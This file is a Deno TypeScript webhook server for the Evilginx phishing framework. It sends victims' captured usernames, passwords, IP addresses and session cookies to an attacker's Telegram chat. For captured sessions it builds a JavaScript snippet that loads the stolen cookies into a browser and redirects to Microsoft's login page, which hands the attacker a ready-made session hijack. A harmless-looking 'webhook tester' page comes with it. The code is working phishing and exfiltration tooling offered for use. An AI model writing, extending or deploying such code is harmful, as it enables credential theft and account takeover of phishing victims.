Deno.serve(async (request: Request) => {
  const url = new URL(request.url);

  // Serve the frontend UI
  if (request.method === 'GET' && url.pathname === '/') {
    return new Response(getHTML(), {
      headers: { 'Content-Type': 'text/html' }
    });
  }

  // Handle manual test from frontend
  if (request.method === 'POST' && url.pathname === '/test') {
    return handleManualTest(request);
  }

  // Handle webhook from Evilginx
  if (request.method === 'POST' && url.pathname === '/webhook') {
    return handleWebhook(request);
  }

  return new Response('Not found', { status: 404 });
});

async function handleManualTest(request: Request) {
  try {
    const { botToken, chatId, message } = await request.json();

    if (!botToken || !chatId || !message) {
      return Response.json({
        success: false,
        error: 'Missing required fields'
      }, { status: 400 });
    }

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const result = await telegramResponse.json();

    if (!result.ok) {
      return Response.json({
        success: false,
        error: result.description || 'Telegram API error',
        errorCode: result.error_code
      }, { status: 400 });
    }

    return Response.json({
      success: true,
      message: 'Message sent successfully!'
    });

  } catch (error) {
    return Response.json({
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 });
  }
}

async function handleWebhook(request: Request) {
  try {
    const payload = await request.json();
    
    // Get environment variables
    const API_TOKEN = Deno.env.get('API_TOKEN');
    const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
    
    // Verify API token
    const authHeader = request.headers.get('Authorization');
    if (API_TOKEN && authHeader !== `Bearer ${API_TOKEN}`) {
      return Response.json({ error: 'Unauthorized' }, { status: 401 });
    }

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram credentials');
      return Response.json({ error: 'Server configuration error' }, { status: 500 });
    }

    // Get IP geolocation
    const ip = payload.origin;
    const countryData = await getIPGeolocation(ip);
    
    // Handle different event types
    if (payload.event === 'session_captured') {
      if (payload.session?.cookies?.length > 0) {
        await sendSessionCapturedWithFile(payload, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, countryData);
      } else {
        await sendInvalidCredentialMessage(payload, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, countryData);
      }
    } else if (payload.event === 'credential_captured') {
      await sendInvalidCredentialMessage(payload, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, countryData);
    } else {
      await sendRegularMessage(payload, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, countryData);
    }
    
    return Response.json({ 
      message: 'Webhook received successfully',
      event: payload.event
    });
    
  } catch (error) {
    console.error('Error in webhook handler:', error);
    return Response.json({ 
      error: 'Error processing webhook'
    }, { status: 400 });
  }
}

async function getIPGeolocation(ip: string) {
  try {
    if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || 
        ip.startsWith('10.') || ip.startsWith('172.')) {
      return { country: 'Local', flag: '🏠' };
    }
    
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    if (response.ok) {
      const data = await response.json();
      const country = data.country_name || 'Unknown';
      const countryCode = data.country_code || '';
      const flag = countryCode ? getFlagEmoji(countryCode) : '🏳️';
      return { country, flag, countryCode };
    }
  } catch (error) {
    console.error('Geolocation error:', error);
  }
  
  return { country: 'Unknown', flag: '🏳️', countryCode: '' };
}

function getFlagEmoji(countryCode: string): string {
  if (!countryCode || countryCode.length !== 2) return '🏳️';
  
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt(0));
  
  return String.fromCodePoint(...codePoints);
}

async function sendSessionCapturedWithFile(
  payload: any, 
  botToken: string, 
  chatId: string, 
  countryData: any
) {
  const { origin, phishlet, session } = payload;
  const cookies = session.cookies;
  
  const caption = formatSessionCapturedCaption(payload, countryData);
  
  const username = session.credentials?.username || 'unknown';
  const password = session.credentials?.password || '';
  
  let redirectUrl = 'https://login.microsoftonline.com';
  if (phishlet && phishlet.toLowerCase().includes('microsoft')) {
    redirectUrl = 'https://login.microsoftonline.com';
  }
  
  // Escape backticks and template literals in the cookies JSON
  const cookiesJson = JSON.stringify(cookies).replace(/\\/g, '\\\\').replace(/`/g, '\\`');
  
  const jsCode = `let ipaddress = \`${origin}\`;
let email = \`${username}\`;
let password = \`${password}\`;
!function(){let e=JSON.parse(\`${cookiesJson}\`);
for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}Secure;SameSite=None\`;
window.location.href=atob('${btoa(redirectUrl)}')}();`;
  
  const formData = new FormData();
  const blob = new Blob([jsCode], { type: 'text/plain' });
  formData.append('document', blob, `${username}.txt`);
  formData.append('chat_id', chatId);
  formData.append('caption', caption);
  formData.append('parse_mode', 'HTML');
  
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
  
  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      body: formData
    });
    
    if (!response.ok) {
      const error = await response.text();
      console.error('Telegram sendDocument error:', error);
    }
  } catch (error) {
    console.error('Error sending file to Telegram:', error);
  }
}

async function sendInvalidCredentialMessage(
  payload: any,
  botToken: string,
  chatId: string,
  countryData: any
) {
  const { server_name, origin, session } = payload;
  const { country, flag } = countryData;
  
  let message = `<b>🚫 INVALID CREDENTIAL CAPTURED</b>\n\n`;
  message += `<b>🌐 Server:</b> ${server_name}\n`;
  message += `<b>📍 IP:</b> <code>${origin}</code>\n`;
  message += `<b>🗾 Country:</b> ${country} ${flag}\n`;
  
  const credentials = session?.credentials || payload.credentials || {};
  
  if (credentials.username) {
    message += `<b>👤 username:</b> <code>${credentials.username}</code>\n`;
  }
  if (credentials.password) {
    message += `<b>🔑 password:</b> <code>${credentials.password}</code>\n`;
  }
  
  for (const [key, value] of Object.entries(credentials)) {
    if (key !== 'username' && key !== 'password' && value) {
      message += `<b>${key}:</b> <code>${value}</code>\n`;
    }
  }
  
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  });
}

async function sendRegularMessage(
  payload: any,
  botToken: string,
  chatId: string,
  countryData: any
) {
  const message = formatRegularMessage(payload, countryData);
  
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  });
}

function formatSessionCapturedCaption(payload: any, countryData: any): string {
  const { server_name, origin, session } = payload;
  const { country, flag } = countryData;
  
  let caption = `<b>🍪 COOKIES CAPTURED</b>\n\n`;
  caption += `<b>🌐 Server:</b> ${server_name}\n`;
  caption += `<b>📍 IP:</b> <code>${origin}</code>\n`;
  caption += `<b>🗾 Country:</b> ${country} ${flag}\n`;
  
  if (session?.credentials) {
    if (session.credentials.username) {
      caption += `<b>👤 username:</b> <code>${session.credentials.username}</code>\n`;
    }
    if (session.credentials.password) {
      caption += `<b>🔑 password:</b> <code>${session.credentials.password}</code>\n`;
    }
    
    for (const [key, value] of Object.entries(session.credentials)) {
      if (key !== 'username' && key !== 'password') {
        caption += `<b>${key}:</b> <code>${value}</code>\n`;
      }
    }
  }
  
  if (session?.cookies?.length > 0) {
    caption += `\n✅ Love is Evol. Dey with me!.`;
  }
  
  return caption;
}

function formatRegularMessage(payload: any, countryData: any): string {
  const { server_name, event, origin } = payload;
  const { country, flag } = countryData;

  const eventEmojis: Record<string, string> = {
    lure_clicked: '🪝',
    lure_landed: '🎣'
  };

  const eventLabels: Record<string, string> = {
    lure_landed: 'LINK LANDED'
  };

  const emoji = eventEmojis[event] || '🔔';
  const eventName = eventLabels[event] ?? event.replace(/_/g, ' ').toUpperCase();

  let message = `<b>${emoji} ${eventName}</b>\n\n`;
  message += `<b>🌐 Server:</b> ${server_name}\n`;
  message += `<b>📍 IP:</b> <code>${origin}</code>\n`;
  message += `<b>🗾 Country:</b> ${country} ${flag}\n`;

  return message;
}

function getHTML(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Webhook Tester</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: white;
      border-radius: 16px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px;
      max-width: 600px;
      width: 100%;
    }
    h1 { font-size: 28px; margin-bottom: 10px; color: #2d3748; text-align: center; }
    .subtitle { text-align: center; color: #718096; margin-bottom: 30px; font-size: 14px; }
    .form-group { margin-bottom: 20px; }
    label { display: block; margin-bottom: 8px; color: #4a5568; font-weight: 600; font-size: 14px; }
    input, textarea {
      width: 100%;
      padding: 12px 16px;
      border: 2px solid #e2e8f0;
      border-radius: 8px;
      font-size: 14px;
      font-family: inherit;
    }
    input:focus, textarea:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }
    textarea { resize: vertical; min-height: 100px; }
    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }
    button:hover { transform: translateY(-2px); }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    .result {
      margin-top: 20px;
      padding: 16px;
      border-radius: 8px;
      font-size: 14px;
      display: none;
      white-space: pre-wrap;
    }
    .result.success { background: #c6f6d5; border: 2px solid #48bb78; color: #22543d; display: block; }
    .result.error { background: #fed7d7; border: 2px solid #fc8181; color: #742a2a; display: block; }
    .hint { font-size: 12px; color: #a0aec0; margin-top: 4px; }
    .webhook-info {
      background: #f7fafc;
      border: 2px solid #e2e8f0;
      border-radius: 8px;
      padding: 16px;
      margin-bottom: 30px;
    }
    .webhook-info h3 { font-size: 14px; color: #4a5568; margin-bottom: 8px; }
    .webhook-info code {
      background: #edf2f7;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 13px;
      word-break: break-all;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>📱 Telegram Webhook Tester</h1>
    <p class="subtitle">Test your Telegram bot integration</p>
    <div class="webhook-info">
      <h3>Webhook Endpoint:</h3>
      <code id="webhookUrl"></code>
    </div>
    <form id="testForm">
      <div class="form-group">
        <label for="botToken">Bot Token</label>
        <input type="text" id="botToken" placeholder="123456789:ABC..." required>
        <div class="hint">Get from @BotFather in Telegram</div>
      </div>
      <div class="form-group">
        <label for="chatId">Chat ID</label>
        <input type="text" id="chatId" placeholder="123456789" required>
        <div class="hint">Get from @userinfobot</div>
      </div>
      <div class="form-group">
        <label for="message">Test Message</label>
        <textarea id="message" required>🧪 Test Message

This is a test from your Evilginx webhook!

If you see this, your bot is working correctly. ✅</textarea>
      </div>
      <button type="submit" id="submitBtn">Send Test Message</button>
    </form>
    <div id="result" class="result"></div>
  </div>
  <script>
    document.getElementById('webhookUrl').textContent = window.location.origin + '/webhook';
    document.getElementById('testForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const submitBtn = document.getElementById('submitBtn');
      const result = document.getElementById('result');
      submitBtn.disabled = true;
      submitBtn.textContent = 'Sending...';
      result.style.display = 'none';
      try {
        const response = await fetch('/test', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            botToken: document.getElementById('botToken').value.trim(),
            chatId: document.getElementById('chatId').value.trim(),
            message: document.getElementById('message').value
          })
        });
        const data = await response.json();
        if (data.success) {
          result.className = 'result success';
          result.textContent = '✅ ' + data.message;
        } else {
          result.className = 'result error';
          result.textContent = '❌ Error: ' + data.error + (data.errorCode ? ' (Code: ' + data.errorCode + ')' : '');
        }
      } catch (error) {
        result.className = 'result error';
        result.textContent = '❌ Request failed: ' + error.message;
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Send Test Message';
      }
    });
  </script>
</body>
</html>`;
}
